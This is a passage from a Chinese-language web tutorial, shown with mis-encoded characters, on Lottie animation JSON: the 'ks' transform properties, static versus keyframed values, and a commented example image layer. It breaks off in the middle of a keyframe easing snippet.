<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†é¦–å…ˆæ·±å…¥è§£æå…¶ä¸­æœ€æ ¸å¿ƒçš„Â <strong><code>ks</code>ï¼ˆå˜æ¢å±æ€§ï¼‰</strong> Â å¯¹è±¡ï¼Œå®ƒæ˜¯é©±åŠ¨æ‰€æœ‰å›¾å±‚è¿åŠ¨ä¸å˜åŒ–çš„å…³é”®ã€‚</p>
<h2 data-id="heading-7"><strong>ä¸‰ã€å˜æ¢å±æ€§ - ä½ç½®ã€æ—‹è½¬ã€ç¼©æ”¾</strong>â­ï¸</h2>
<h3 data-id="heading-8">ksÂ å¯¹è±¡æ¦‚è§ˆ</h3>
<p><code>ks</code>ï¼ˆTransformï¼‰æ˜¯æ‰€æœ‰å›¾å±‚çš„æ ¸å¿ƒåŠ¨ç”»å®¹å™¨ï¼Œå®ƒå®šä¹‰äº†å›¾å±‚åœ¨ç©ºé—´ä¸­çš„ä½ç½®ã€å¤§å°ã€æ—‹è½¬ã€é€æ˜åº¦ç­‰åŸºç¡€å˜æ¢çŠ¶æ€ã€‚å…¶åç§°Â <strong><code>ks</code></strong>Â æ˜¯Â <strong>Keyable Styled Propertiesï¼ˆå¯å…³é”®å¸§çš„æ ·å¼åŒ–å±æ€§ï¼‰</strong> Â çš„ç¼©å†™ï¼Œè¿™ç²¾å‡†æ¦‚æ‹¬äº†å…¶ä¸¤å¤§æ ¸å¿ƒç‰¹æ€§ï¼š</p>
<ul>
<li><strong><code>k</code>ï¼ˆKeyableï¼‰</strong> ï¼šæŒ‡è¿™äº›å±æ€§<strong>å¯è¢«è®¾ç½®ä¸ºå…³é”®å¸§</strong>ï¼Œæ˜¯å®ç°æ‰€æœ‰é€å¸§åŠ¨ç”»çš„åŸºç¡€ã€‚</li>
<li><strong><code>s</code>ï¼ˆStyledï¼‰</strong> ï¼šæŒ‡è¿™äº›å±æ€§<strong>å¯è¢«åŠ¨æ€é©±åŠ¨æˆ–èµ‹äºˆæ ·å¼</strong>ï¼Œæ”¯æŒé€šè¿‡æ•°æ®æˆ–è¡¨è¾¾å¼è¿›è¡Œå¤æ‚æ§åˆ¶ã€‚</li>
</ul>
<p>å› æ­¤ï¼Œ<code>ks</code>Â å¯¹è±¡ä¸ä»…æè¿°å›¾å±‚çš„é™æ€ç©ºé—´çŠ¶æ€ï¼Œæ›´æ˜¯æ‰¿è½½å…¶æ‰€æœ‰è¿åŠ¨ä¸å˜æ¢åŠ¨ç”»çš„<strong>æ•°æ®è½½ä½“</strong>ã€‚æ‰€æœ‰åŸºç¡€åŠ¨ç”»ï¼ˆå¦‚ç§»åŠ¨ã€ç¼©æ”¾ã€æ—‹è½¬ã€æ·¡å…¥æ·¡å‡ºï¼‰éƒ½é€šè¿‡åœ¨æ­¤å¯¹è±¡å†…å®šä¹‰å…³é”®å¸§æ¥å®ç°ã€‚</p>
<h3 data-id="heading-9"><strong>ksÂ çš„å®Œæ•´å±æ€§è¡¨</strong></h3>





















































<table><thead><tr><th>å±æ€§</th><th>å…¨ç§°</th><th>é»˜è®¤å€¼</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td><strong><code>a</code></strong></td><td>Anchor Point</td><td><code>[0, 0, 0]</code></td><td><strong>é”šç‚¹</strong>ï¼šå›¾å±‚å˜æ¢çš„åŸºå‡†ä¸­å¿ƒç‚¹ï¼ˆæ”¯ç‚¹ï¼‰ã€‚</td></tr><tr><td><strong><code>p</code></strong></td><td>Position</td><td><code>[0, 0, 0]</code></td><td><strong>ä½ç½®</strong>ï¼šå›¾å±‚åœ¨ç”»å¸ƒä¸­çš„åæ ‡ã€‚</td></tr><tr><td><strong><code>s</code></strong></td><td>Scale</td><td><code>[100, 100, 100]</code></td><td><strong>ç¼©æ”¾</strong>ï¼šå›¾å±‚çš„å°ºå¯¸æ¯”ä¾‹ï¼ˆä»¥ç™¾åˆ†æ¯”è¡¨ç¤ºï¼‰ã€‚</td></tr><tr><td><strong><code>r</code></strong></td><td>Rotation</td><td><code>0</code></td><td><strong>æ—‹è½¬</strong>ï¼šå›¾å±‚çš„æ—‹è½¬è§’åº¦ï¼ˆå•ä½ä¸ºåº¦ï¼‰ã€‚</td></tr><tr><td><strong><code>o</code></strong></td><td>Opacity</td><td><code>100</code></td><td><strong>ä¸é€æ˜åº¦</strong>ï¼šå›¾å±‚çš„é€æ˜åº¦ï¼ˆ100ä¸ºå®Œå…¨ä¸é€æ˜ï¼Œ0ä¸ºå®Œå…¨é€æ˜ï¼‰ã€‚</td></tr><tr><td><strong><code>sk</code></strong></td><td>Skew</td><td><code>0</code></td><td><strong>å€¾æ–œ</strong>ï¼šå›¾å±‚çš„å€¾æ–œè§’åº¦ï¼ˆå•ä½ä¸ºåº¦ï¼‰ã€‚</td></tr><tr><td><strong><code>sa</code></strong></td><td>Skew Axis</td><td><code>0</code></td><td><strong>å€¾æ–œè½´</strong>ï¼šå®šä¹‰å€¾æ–œæ“ä½œæ‰€æ²¿çš„è½´å‘è§’åº¦ï¼ˆå•ä½ä¸ºåº¦ï¼‰ã€‚</td></tr></tbody></table>
<blockquote>
<p>Â 3DÂ å›¾å±‚ç‰¹æ®Šå½¢å¼ï¼šå½“Â ddd=1Â æ—¶ï¼ŒpÂ å¯èƒ½è¢«æ‹†åˆ†ä¸ºÂ pxã€pyã€pzÂ ä¸‰ä¸ªç‹¬ç«‹å±æ€§ã€‚</p>
</blockquote>
<h3 data-id="heading-10"><strong>å±æ€§å€¼çš„ä¸¤ç§æ•°æ®å½¢æ€</strong></h3>
<p>æ¯ä¸ªå˜æ¢å±æ€§çš„å€¼å‡ä»¥ç»Ÿä¸€çš„ç»“æ„è¡¨ç¤ºï¼Œåˆ†ä¸ºÂ <strong>é™æ€å€¼</strong>Â ä¸Â <strong>åŠ¨ç”»å€¼</strong>Â ä¸¤ç§å½¢æ€ï¼Œé€šè¿‡Â <code>a</code>Â å­—æ®µåŒºåˆ†ã€‚</p>
<h4 data-id="heading-11"><strong>1. é™æ€å€¼ (<code>a</code>: 0)</strong></h4>
<p>å±æ€§åœ¨æ•´ä¸ªæ—¶é—´è½´ä¸Šä¿æŒä¸å˜ï¼Œç»“æ„ç®€æ´ã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"r"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// é™æ€æ ‡è¯†</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">45</span>        <span class="hljs-comment">// å›ºå®šå€¼ï¼šæ—‹è½¬45åº¦</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-12"><strong>2. åŠ¨ç”»å€¼ (<code>a</code>: 1)</strong></h4>
<p>å±æ€§å€¼éšæ—¶é—´å˜åŒ–ï¼Œé€šè¿‡å…³é”®å¸§æ•°ç»„ (<code>k</code>) å®šä¹‰ã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"r"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// åŠ¨ç”»æ ‡è¯†</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>         <span class="hljs-comment">// å…³é”®å¸§æ•°ç»„</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// æ—¶é—´ç‚¹ï¼ˆå¸§ï¼‰</span>
        <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// èµ·å§‹å€¼</span>
        <span class="hljs-attr">"e"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">360</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// ç»“æŸå€¼</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">60</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// ä¸‹ä¸€å…³é”®å¸§æ—¶é—´ç‚¹</span>
        <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">360</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// è¯¥å¸§çš„æ•°å€¼ï¼ˆç»“æŸæ—¶çœç•¥"e"ï¼‰</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>å…³é”®å¸§æ ¸å¿ƒå­—æ®µè¯´æ˜</strong>ï¼š</p>
<ul>
<li><strong><code>t</code>Â (time)</strong> ï¼šå…³é”®å¸§æ‰€å¤„çš„æ—¶é—´ç‚¹ï¼ˆå¸§åºå·ï¼‰ã€‚</li>
<li><strong><code>s</code>Â (start value)</strong> ï¼šæ­¤å…³é”®å¸§çš„èµ·å§‹å€¼ã€‚</li>
<li><strong><code>e</code>Â (end value)</strong> ï¼šæœå‘ä¸‹ä¸€å…³é”®å¸§çš„<strong>ç›®æ ‡å€¼</strong>ã€‚æœ€åä¸€ä¸ªå…³é”®å¸§å¯çœç•¥ã€‚</li>
<li><strong><code>i</code>Â /Â <code>o</code></strong>ï¼šå®šä¹‰å±æ€§å˜åŒ–é€Ÿç‡ï¼ˆç¼“åŠ¨ï¼‰çš„è´å¡å°”æ›²çº¿æ§åˆ¶ç‚¹ï¼Œå°†åœ¨åç»­ç« èŠ‚è¯¦è¿°ã€‚</li>
</ul>
<p>æ­¤ç»“æ„æ˜¯ Lottie å®ç°æ‰€æœ‰åŸºç¡€è¿åŠ¨ï¼ˆä½ç§»ã€ç¼©æ”¾ã€æ—‹è½¬ã€æ·¡å…¥æ·¡å‡ºï¼‰çš„é€šç”¨æ•°æ®èŒƒå¼ã€‚</p>
<h3 data-id="heading-13">ğŸ¨å°è¯•ç‰›åˆ€ï¼šåŠ¨æ‰‹éªŒè¯æ ¸å¿ƒæ¦‚å¿µ</h3>
<p>é€šè¿‡å‰é¢çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å·²ç»æŒæ¡äº† Lottie JSON çš„é¡¶å±‚ç»“æ„å’Œæ ¸å¿ƒå±æ€§ã€‚ç°åœ¨ï¼Œè®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå…·ä½“çš„ä¾‹å­ï¼ŒåŠ¨æ‰‹éªŒè¯å¦‚ä½•é…ç½®ä¸€ä¸ªåŸºç¡€çš„é™æ€åœºæ™¯ã€‚</p>
<p>åœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä¸€å¼ å›¾ç‰‡ï¼Œåˆ›å»ºä¸€ä¸ª<strong>é™æ€çš„å›¾ç‰‡å›¾å±‚</strong>ã€‚æ‚¨å°†åœ¨ä¸‹å›¾ä¸­çœ‹åˆ°ï¼ˆä¸€ä¸ªé™æ€å›¾ï¼Œä¸€ä¸ªæ—‹è½¬å›¾ï¼‰ï¼š</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/797a4950337a4e9ab0ddb4de2e7afc33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOo5Y2r5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876452&amp;x-signature=yzgDCdB54V1rtVwQfYETtwLpQco%3D" alt="å½•å±2026-01-07 11.51.03 (1).gif" loading="lazy"/></p>
<blockquote>
<p><strong>è¯´æ˜</strong>ï¼šä¸Šå›¾çš„ GIF å±•ç¤ºäº†åŒ…å«æ—‹è½¬åŠ¨ç”»çš„å®Œæ•´æ•ˆæœã€‚è€Œä¸‹é¢çš„ JSON é…ç½®ï¼Œæˆ‘ä»¬å°†é¦–å…ˆå®Œæˆ<strong>å·¦ä¾§é™æ€å›¾ç‰‡</strong>çš„æ­å»ºã€‚è¿™èƒ½è®©æˆ‘ä»¬ä¸“æ³¨äºå·²å­¦çš„<strong>é™æ€å±æ€§é…ç½®</strong>ï¼ˆ<code>a: 0</code>ï¼‰ã€‚å³ä¾§çš„æ—‹è½¬åŠ¨ç”»ï¼Œå°†åœ¨æˆ‘ä»¬å­¦ä¹ äº†å…³é”®å¸§ç³»ç»Ÿåï¼Œé€šè¿‡ç®€å•åœ°ä¿®æ”¹Â <code>r</code>ï¼ˆæ—‹è½¬ï¼‰å±æ€§å³å¯å®ç°ã€‚</p>
</blockquote>
<p>ä»¥ä¸‹æ˜¯å®Œæ•´çš„ Lottie JSON é…ç½®ï¼Œå·²é™„ä¸Šè¯¦å°½çš„æ³¨é‡Šï¼š</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-comment">// ========== é¡¶å±‚å…ƒæ•°æ®ï¼šåŠ¨ç”»çš„å…¨å±€å®šä¹‰ ==========</span>
  <span class="hljs-string">"v"</span>: <span class="hljs-string">"5.7.4"</span>,              <span class="hljs-comment">// Bodymovin æ’ä»¶ç‰ˆæœ¬</span>
  <span class="hljs-string">"fr"</span>: <span class="hljs-number">30</span>,                  <span class="hljs-comment">// å¸§ç‡ï¼š30fps</span>
  <span class="hljs-string">"ip"</span>: <span class="hljs-number">0</span>,                   <span class="hljs-comment">// èµ·å§‹å¸§ï¼šä»ç¬¬0å¸§å¼€å§‹</span>
  <span class="hljs-string">"op"</span>: <span class="hljs-number">90</span>,                  <span class="hljs-comment">// ç»“æŸå¸§ï¼šåˆ°ç¬¬90å¸§ç»“æŸï¼ˆæ€»æ—¶é•¿ = (90-0)/30 = 3ç§’ï¼‰</span>
  <span class="hljs-string">"w"</span>: <span class="hljs-number">800</span>,                  <span class="hljs-comment">// ç”»å¸ƒå®½åº¦ï¼š800åƒç´ </span>
  <span class="hljs-string">"h"</span>: <span class="hljs-number">600</span>,                  <span class="hljs-comment">// ç”»å¸ƒé«˜åº¦ï¼š600åƒç´ </span>
  <span class="hljs-string">"nm"</span>: <span class="hljs-string">"å˜æ¢å±æ€§æ¼”ç¤º"</span>,        <span class="hljs-comment">// åˆæˆåç§°</span>
  <span class="hljs-string">"ddd"</span>: <span class="hljs-number">0</span>,                  <span class="hljs-comment">// 3Dæ ‡è¯†ï¼š0è¡¨ç¤ºä¸åŒ…å«3Då›¾å±‚</span>
  
  <span class="hljs-comment">// ========== Assetsï¼šå¯å¤ç”¨èµ„æºåº“ ==========</span>
  <span class="hljs-string">"assets"</span>: [
    {
      <span class="hljs-string">"id"</span>: <span class="hljs-string">"image_0"</span>,       <span class="hljs-comment">// èµ„æºIDï¼Œä¾›å›¾å±‚é€šè¿‡ refId å¼•ç”¨</span>
      <span class="hljs-string">"w"</span>: <span class="hljs-number">500</span>,              <span class="hljs-comment">// å›¾ç‰‡åŸå§‹å®½åº¦</span>
      <span class="hljs-string">"h"</span>: <span class="hljs-number">500</span>,              <span class="hljs-comment">// å›¾ç‰‡åŸå§‹é«˜åº¦</span>
      <span class="hljs-string">"u"</span>: <span class="hljs-string">""</span>,               <span class="hljs-comment">// å›¾ç‰‡URLåŸºç¡€è·¯å¾„ï¼ˆç©ºè¡¨ç¤ºä½¿ç”¨å®Œæ•´è·¯å¾„ï¼‰</span>
      <span class="hljs-string">"p"</span>: <span class="hljs-string">"https://img11.360buyimg.com/img/jfs/t1/383242/14/16667/276460/695dd5ccF565013e8/02761c81c82b92d4.png"</span>,  <span class="hljs-comment">// å›¾ç‰‡å®Œæ•´URL</span>
      <span class="hljs-string">"e"</span>: <span class="hljs-number">0</span>                 <span class="hljs-comment">// æ˜¯å¦åµŒå…¥ï¼š0è¡¨ç¤ºå¤–éƒ¨é“¾æ¥</span>
    }
  ],
  
  <span class="hljs-comment">// ========== Layersï¼šå›¾å±‚åºåˆ—ï¼ˆä»ä¸‹åˆ°ä¸Šæ¸²æŸ“ï¼‰ ==========</span>
  <span class="hljs-string">"layers"</span>: [
    <span class="hljs-comment">// ---------- å›¾å±‚1ï¼šé™æ€å›¾ç‰‡ï¼ˆå±•ç¤ºé™æ€å€¼ a:0ï¼‰ ----------</span>
    {
      <span class="hljs-string">"ddd"</span>: <span class="hljs-number">0</span>,              <span class="hljs-comment">// è¯¥å›¾å±‚ä¸æ˜¯3Då›¾å±‚</span>
      <span class="hljs-string">"ind"</span>: <span class="hljs-number">1</span>,              <span class="hljs-comment">// å›¾å±‚ç´¢å¼•ï¼š1ï¼ˆå”¯ä¸€æ ‡è¯†ï¼‰</span>
      <span class="hljs-string">"ty"</span>: <span class="hljs-number">2</span>,               <span class="hljs-comment">// å›¾å±‚ç±»å‹ï¼š2 = Image Layerï¼ˆå›¾åƒå›¾å±‚ï¼‰</span>
      <span class="hljs-string">"nm"</span>: <span class="hljs-string">"é™æ€å›¾ç‰‡"</span>,       <span class="hljs-comment">// å›¾å±‚åç§°</span>
      <span class="hljs-string">"refId"</span>: <span class="hljs-string">"image_0"</span>,    <span class="hljs-comment">// å¼•ç”¨ assets ä¸­ id ä¸º "image_0" çš„èµ„æº</span>
      <span class="hljs-string">"sr"</span>: <span class="hljs-number">1</span>,               <span class="hljs-comment">// æ—¶é—´æ‹‰ä¼¸ï¼š1 = æ­£å¸¸é€Ÿåº¦</span>
      
      <span class="hljs-comment">// ===== ksï¼šå˜æ¢å±æ€§ï¼ˆTransformï¼‰=====</span>
      <span class="hljs-string">"ks"</span>: {
        <span class="hljs-comment">// ----- oï¼šä¸é€æ˜åº¦ï¼ˆOpacityï¼‰-----</span>
        <span class="hljs-string">"o"</span>: {
          <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,            <span class="hljs-comment">// é™æ€å€¼æ ‡è¯†ï¼ˆa=0 è¡¨ç¤ºä¸åŠ¨ç”»ï¼‰</span>
          <span class="hljs-string">"k"</span>: <span class="hljs-number">100</span>           <span class="hljs-comment">// å›ºå®šå€¼ï¼š100%ä¸é€æ˜</span>
        },
        
        <span class="hljs-comment">// ----- rï¼šæ—‹è½¬ï¼ˆRotationï¼‰-----</span>
        <span class="hljs-string">"r"</span>: {
          <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,            <span class="hljs-comment">// é™æ€å€¼æ ‡è¯†</span>
          <span class="hljs-string">"k"</span>: <span class="hljs-number">45</span>            <span class="hljs-comment">// å›ºå®šå€¼ï¼šæ—‹è½¬45åº¦</span>
        },
        
        <span class="hljs-comment">// ----- pï¼šä½ç½®ï¼ˆPositionï¼‰-----</span>
        <span class="hljs-string">"p"</span>: {
          <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,            <span class="hljs-comment">// é™æ€å€¼æ ‡è¯†</span>
          <span class="hljs-string">"k"</span>: [<span class="hljs-number">250</span>, <span class="hljs-number">300</span>, <span class="hljs-number">0</span>] <span class="hljs-comment">// å›ºå®šä½ç½®ï¼š[x, y, z] = å·¦ä¾§250pxï¼Œé¡¶éƒ¨300px</span>
        },
        
        <span class="hljs-comment">// ----- aï¼šé”šç‚¹ï¼ˆAnchor Pointï¼‰-----</span>
        <span class="hljs-string">"a"</span>: {
          <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,            <span class="hljs-comment">// é™æ€å€¼æ ‡è¯†</span>
          <span class="hljs-string">"k"</span>: [<span class="hljs-number">250</span>, <span class="hljs-number">250</span>, <span class="hljs-number">0</span>] <span class="hljs-comment">// é”šç‚¹åœ¨å›¾ç‰‡ä¸­å¿ƒï¼ˆ500x500å›¾ç‰‡çš„ä¸­å¿ƒç‚¹ï¼‰</span>
        },
        
        <span class="hljs-comment">// ----- sï¼šç¼©æ”¾ï¼ˆScaleï¼‰-----</span>
        <span class="hljs-string">"s"</span>: {
          <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,            <span class="hljs-comment">// é™æ€å€¼æ ‡è¯†</span>
          <span class="hljs-string">"k"</span>: [<span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">100</span>] <span class="hljs-comment">// ç¼©æ”¾åˆ°30%ï¼ˆæ˜¾ç¤ºä¸º150x150ï¼‰</span>
        }
      },
      
      <span class="hljs-string">"ao"</span>: <span class="hljs-number">0</span>,               <span class="hljs-comment">// è‡ªåŠ¨å®šå‘ï¼šå…³é—­</span>
      <span class="hljs-string">"ip"</span>: <span class="hljs-number">0</span>,               <span class="hljs-comment">// å›¾å±‚å…¥ç‚¹ï¼šç¬¬0å¸§å¼€å§‹æ˜¾ç¤º</span>
      <span class="hljs-string">"op"</span>: <span class="hljs-number">90</span>,              <span class="hljs-comment">// å›¾å±‚å‡ºç‚¹ï¼šç¬¬90å¸§ç»“æŸæ˜¾ç¤º</span>
      <span class="hljs-string">"st"</span>: <span class="hljs-number">0</span>,               <span class="hljs-comment">// èµ·å§‹æ—¶é—´åç§»ï¼š0ï¼ˆæ— åç§»ï¼‰</span>
      <span class="hljs-string">"bm"</span>: <span class="hljs-number">0</span>                <span class="hljs-comment">// æ··åˆæ¨¡å¼ï¼š0 = Normalï¼ˆæ­£å¸¸ï¼‰</span>
    }
  ],
  
  <span class="hljs-comment">// ========== Charsï¼šçŸ¢é‡å­—å½¢å®šä¹‰ï¼ˆæœ¬ä¾‹æœªä½¿ç”¨ï¼‰==========</span>
  <span class="hljs-string">"chars"</span>: []
}
</code></pre>
<p>è¿™ä¸ªç¤ºä¾‹æ˜¯ä¸€ä¸ªâ€œçŸ¥è¯†æ£€æŸ¥ç‚¹â€ï¼Œæ¸…æ™°åœ°å±•ç¤ºäº†ï¼š</p>
<ul>
<li><strong>é¡¶å±‚å…ƒæ•°æ®</strong>Â (<code>v</code>,Â <code>fr</code>,Â <code>w</code>,Â <code>h</code>...) å®šä¹‰äº†åŠ¨ç”»çš„èˆå°ï¼ˆ3ç§’ã€800x600çš„ç”»å¸ƒï¼‰ã€‚</li>
<li><strong>èµ„æº (<code>assets</code>)</strong> Â å®šä¹‰äº†å”¯ä¸€å¯ç”¨çš„å›¾ç‰‡ç´ æï¼Œå¹¶é€šè¿‡Â <code>id</code>Â æ ‡è¯†ã€‚</li>
<li><strong>å›¾å±‚ (<code>layers</code>)</strong> Â é€šè¿‡Â <code>refId</code>Â å¼•ç”¨è¯¥èµ„æºï¼Œå°†å…¶å®ä¾‹åŒ–åˆ°èˆå°ä¸Šã€‚</li>
<li><strong><code>ks</code>Â å˜æ¢å¯¹è±¡</strong>Â å†³å®šäº†è¿™ä¸ªå®ä¾‹çš„æœ€ç»ˆçŠ¶æ€ï¼šä½äºç”»å¸ƒå·¦ä¾§ï¼Œç¼©å°è‡³30%ï¼Œå¹¶æ—‹è½¬äº†45åº¦ã€‚æ‰€æœ‰å±æ€§å‡ä»¥<strong>é™æ€å€¼ (<code>a: 0</code>)</strong> Â å®šä¹‰ã€‚</li>
</ul>
<p>è‡³æ­¤ï¼Œæ‚¨å·²ç»æŒæ¡äº†å¦‚ä½•æ„å»ºä¸€ä¸ª Lottie åŠ¨ç”»çš„<strong>é™æ€éª¨æ¶</strong>â€”â€”å®šä¹‰èˆå°ã€å‡†å¤‡ç´ æã€æ”¾ç½®å…ƒç´ å¹¶è®¾ç½®å…¶åˆå§‹çŠ¶æ€ã€‚åœ¨ä¸Šæ–¹çš„é¢„è§ˆå›¾ä¸­ï¼Œæ‚¨ä¹Ÿçœ‹åˆ°äº†åŠ¨ç”»çš„æ½œåŠ›ï¼š<strong>åªéœ€å°†Â <code>r</code>ï¼ˆæ—‹è½¬ï¼‰å±æ€§çš„Â <code>a</code>Â å€¼ä»Â <code>0</code>Â æ”¹ä¸ºÂ <code>1</code>ï¼Œå¹¶é…ä¸Šå…³é”®å¸§æ•°æ®ï¼Œé™æ€å›¾ç‰‡å°±èƒ½æ—‹è½¬èµ·æ¥ã€‚</strong></p>
<p>é‚£ä¹ˆï¼Œ<code>a: 1</code>Â æ¨¡å¼ä¸‹çš„Â <code>k</code>Â æ•°ç»„ç©¶ç«Ÿå¦‚ä½•å®šä¹‰ï¼Ÿå¤šä¸ªå…³é”®å¸§ä¹‹é—´å¦‚ä½•å¹³æ»‘è¿‡æ¸¡ï¼ŸåŠ¨ç”»çš„è¿åŠ¨èŠ‚å¥åˆç”±ä»€ä¹ˆæ§åˆ¶ï¼Ÿæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±å°†æ·±å…¥åŠ¨ç”»çš„æ ¸å¿ƒï¼Œè§£æ<strong>å…³é”®å¸§ã€æ’å€¼ä¸ç¼“åŠ¨</strong>çš„å®Œæ•´ç³»ç»Ÿã€‚</p>
<hr/>
<h2 data-id="heading-14"><strong>å››ã€æ·±å…¥åŠ¨ç”» - å…³é”®å¸§ã€æ’å€¼ä¸ç¼“åŠ¨</strong>â­ï¸</h2>
<p>åœ¨ä¸Šä¸€ç« çš„"å°è¯•ç‰›åˆ€"ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†é™æ€å›¾ç‰‡ä¸æ—‹è½¬å›¾ç‰‡çš„å¯¹æ¯”æ•ˆæœã€‚å³ä¾§çš„æ—‹è½¬æ•ˆæœæ­£æ˜¯é€šè¿‡<strong>å…³é”®å¸§åŠ¨ç”»</strong>å®ç°çš„ã€‚ç°åœ¨ï¼Œè®©æˆ‘ä»¬æ·±å…¥è§£æè¿™ä¸ªæ—‹è½¬åŠ¨ç”»çš„å®Œæ•´JSONé…ç½®ï¼Œæ­å¼€LottieåŠ¨ç”»ç³»ç»Ÿçš„æ ¸å¿ƒæœºåˆ¶ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/797a4950337a4e9ab0ddb4de2e7afc33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOo5Y2r5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876452&amp;x-signature=yzgDCdB54V1rtVwQfYETtwLpQco%3D" alt="å½•å±2026-01-07 11.51.03 (1).gif" loading="lazy"/></p>
<p>è®©æˆ‘ä»¬å¯¹æ¯”ä¸€ä¸‹ demo ä¸­ä¸¤ä¸ªå›¾å±‚çš„é…ç½®ï¼Œçœ‹çœ‹é™æ€å›¾ç‰‡æ˜¯å¦‚ä½•"åŠ¨"èµ·æ¥çš„ï¼š</p>
<p><strong>é™æ€å›¾ç‰‡ï¼ˆå·¦ä¾§ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"r"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>            <span class="hljs-comment">// é™æ€å€¼æ ‡è¯†</span>
  <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">45</span>            <span class="hljs-comment">// å›ºå®šå€¼ï¼šæ—‹è½¬45åº¦</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>æ—‹è½¬å›¾ç‰‡ï¼ˆå³ä¾§ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"r"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>            <span class="hljs-comment">// åŠ¨ç”»å€¼æ ‡è¯†ï¼ˆa=1 è¡¨ç¤ºæœ‰å…³é”®å¸§åŠ¨ç”»ï¼‰</span>
  <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>             <span class="hljs-comment">// å…³é”®å¸§æ•°ç»„</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"i"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.667</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// å…¥ç¼“åŠ¨</span>
      <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.333</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// å‡ºç¼“åŠ¨</span>
